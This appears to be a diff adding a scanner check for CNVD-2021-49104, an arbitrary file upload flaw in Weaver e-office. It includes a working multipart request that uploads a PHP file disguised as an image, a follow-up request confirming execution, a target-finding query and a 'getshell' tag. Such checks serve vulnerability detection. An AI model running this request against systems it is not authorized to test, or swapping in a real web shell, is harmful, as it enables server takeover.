@@ -1,0 +1,28 @@
+name: Weaver EOffice Arbitrary File Upload CNVD-2021-49104
+manual: true
+query: app="泛微-EOffice" || app="EOffice"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+      headers:
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+      body: "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data;
+        name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nprint
+        \"test\";\r\n?>\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--"
+    expression: response.status == 200 && response.body.bcontains(b"logo-eoffice.php")
+  r1:
+    request:
+      method: GET
+      path: /images/logo/logo-eoffice.php
+    expression: response.status == 200 && response.body.bcontains(b"test")
+expression: r0() && r1()
+detail:
+  links:
+  - https://chowdera.com/2021/12/202112200602130067.html
+  - https://mp.weixin.qq.com/s?__biz=MzIxNTIzNTExMQ==&mid=2247486095&idx=1&sn=950550f05795d6ae64842a2f3a5b0eca
+  description: Weaver e-office is a standard collaborative mobile office platform
+    under Weaver.
+  tags: getshell
